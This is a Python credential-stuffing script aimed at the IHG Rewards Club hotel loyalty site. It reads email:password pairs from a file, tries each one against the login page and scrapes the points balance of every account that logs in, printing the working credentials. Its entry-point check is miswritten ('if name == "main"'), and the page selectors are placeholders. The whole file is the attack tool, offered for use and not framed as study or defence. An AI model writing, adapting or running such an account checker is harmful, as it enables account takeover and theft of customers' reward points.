import requests
from bs4 import BeautifulSoup

# Replace with the actual login URL and the URL where reward points are displayed
LOGIN_URL = 'https://www.ihg.com/rewardsclub/us/en/login'
REWARDS_URL = 'https://www.ihg.com/rewardsclub/us/en/rewards'  # Example URL

def load_credentials(filename):
    with open(filename, 'r') as file:
        return [line.strip().split(':') for line in file]

def check_login_and_get_points(email, password):
    session = requests.Session()
    
    # Perform login
    response = session.post(LOGIN_URL, data={
        'email': email,
        'password': password
    })

    # Check if login was successful
    if "Invalid credentials" in response.text or response.url == LOGIN_URL:
        return False, None
    
    # Access rewards page
    rewards_response = session.get(REWARDS_URL)
    
    # Check if rewards page was successfully accessed
    if rewards_response.status_code != 200:
        return False, None

    # Parse rewards page for points balance
    soup = BeautifulSoup(rewards_response.text, 'html.parser')
    points_element = soup.find(text='Your Points Balance')  # Adjust selector as needed

    if points_element:
        balance = points_element.find_next().text.strip()
        return True, balance
    else:
        return True, "Points balance not found"

def main():
    credentials = load_credentials('data.txt')
    
    for email, password in credentials:
        valid, balance = check_login_and_get_points(email, password)
        if valid:
            print(f"Valid login found: {email}:{password}")
            print(f"Points Balance: {balance}")
        else:
            print(f"Invalid login: {email}:{password}")

if name == "main":
    main()